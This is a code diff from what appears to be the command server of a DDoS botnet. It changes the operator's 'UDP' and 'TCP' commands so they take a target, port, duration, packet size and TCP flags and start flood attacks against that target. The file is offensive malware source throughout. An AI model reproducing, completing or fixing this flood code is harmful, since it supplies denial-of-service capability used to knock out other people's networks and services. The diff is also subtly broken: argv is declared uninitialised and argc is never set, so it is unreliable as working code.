@@ -180,7 +180,7 @@ void makeRandomStr(unsigned char *buf, int length)
 //////////////////////////////////
 ///////Flood Functions////////////
 //////////////////////////////////
-void sendUDP(int argc, char *argv[ ])
+void sendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int pollinterval)
 {
         struct sockaddr_in dest_addr;
         struct ifreq ifr;
@@ -295,7 +295,7 @@ void sendUDP(int argc, char *argv[ ])
                         i++;
                 }
 }
-void sendTCP(int argc, char *argv[ ])
+void sendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags, int packetsize, int pollinterval)
 {
         struct sockaddr_in dest_addr;
         struct ifreq ifr;
@@ -689,6 +689,8 @@ int Find_Login(char *str) {
     return find_line;
 }
 void *BotWorker(void *sock) {
+	int argc;
+	char *argv[];
 	int datafd = (int)sock;
 	int find_line;
     OperatorsConnected++;
@@ -869,17 +871,38 @@ void *BotWorker(void *sock) {
 								if(send(datafd, "\x1b[37mType: ", 12, MSG_NOSIGNAL) == -1) goto end;
 				continue;
 			}
-                                        if(strstr(buf, "UDP")) {
-			                  
+                                        if(!strcmp(argv[0], "UDP")) {
+
+                                           if(argc < 5)
+                                           {
+                                                       printf("UDP <target> <port (0 for random)> <time> <packet size (1 to 65500)> (time poll interval, default 10)");
+                                                       return;
+                                           }
+			                               unsigned char *target = argv[1];
+                                           int port = atoi(argv[2]);
+                                           int time = atoi(argv[3]);
+                                           int packetsize = atoi(argv[4]);
+                                           int pollinterval = (argc == 6 ? atoi(argv[5]) : 10);
                                            if (listFork()) { return; }
-                                           sendUDP(int argc, char *argv[ ]);
+                                           sendUDP(target, port, time, packetsize, pollinterval);
                                            printf("UDP Flood Started!");
 				           continue;
 					}
-                                        if(strstr(buf, "TCP")) {
-                     
+                                        if(!strcmp(argv[0], "TCP")) {
+
+                                           if(argc < 5)
+                                           {
+                                                       printf("TCP <target> <port (0 for random)> <time> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
+                                                       return;
+                                           }
+			                               unsigned char *target = argv[1];
+                                           int port = atoi(argv[2]);
+                                           int time = atoi(argv[3]);
+                                           unsigned char *flags = argv[4];
+                                           int pollinterval = argc == 7 ? atoi(argv[6]) : 10;
+                                           int psize = argc > 5 ? atoi(argv[5]) : 0;
                                            if (listFork()) { return; }
-                                           sendTCP(int argc, char *argv[ ]);
+                                           sendTCP(target, port, time, flags, psize, pollinterval);
                                            printf("TCP Flood Started!");
 				           continue;
 					}
